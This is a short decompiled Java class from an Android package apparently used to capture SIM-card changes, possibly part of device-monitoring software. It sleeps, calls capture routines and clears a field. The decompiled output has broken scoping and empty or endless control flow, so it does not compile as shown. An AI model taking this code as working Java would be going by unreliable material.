package com.vvt.capture.simchange;

import android.os.SystemClock;

class c
  implements Runnable
{
  c(b paramb) {}
  
  public void run()
  {
    long l = 3000L;
    SystemClock.sleep(l);
    try
    {
      bool = SimChangeCapture.d();
      if (bool) {}
      localObject1 = this.a;
      localObject1 = ((b)localObject1).a;
      SimChangeCapture.a((SimChangeCapture)localObject1);
      localObject1 = this.a;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool = SimChangeCapture.e();
        if (bool) {}
        b localb = this.a;
      }
    }
    finally
    {
      b.a(this.a, null);
    }
    b.a((b)localObject1, null);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/simchange/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */